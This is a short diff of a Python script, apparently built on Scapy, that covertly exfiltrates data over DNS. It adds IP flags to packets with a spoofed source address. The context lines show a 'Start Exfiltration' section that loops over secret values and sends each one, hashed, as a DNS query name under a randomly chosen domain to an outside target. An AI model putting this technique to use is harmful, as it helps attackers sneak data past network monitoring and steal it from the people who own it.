@@ -117,7 +117,7 @@ print("Interval time set : ", INTERVAL)
 print(f"Estimated Completion time : {((INTERVAL+0.12)*len(SECRET))/60} minutes")
 
 # Start Exfiltration
-ip = IP(src=FAKE,dst=TARGET)
+ip = IP(src=FAKE,dst=TARGET,flags=4)
 udp = UDP(dport=PORT)
 for val in SECRET:
     dns = DNS(rd=1,qd=DNSQR(qname=f"https://{hash(str(val))}.{random.choice(domains)}"))
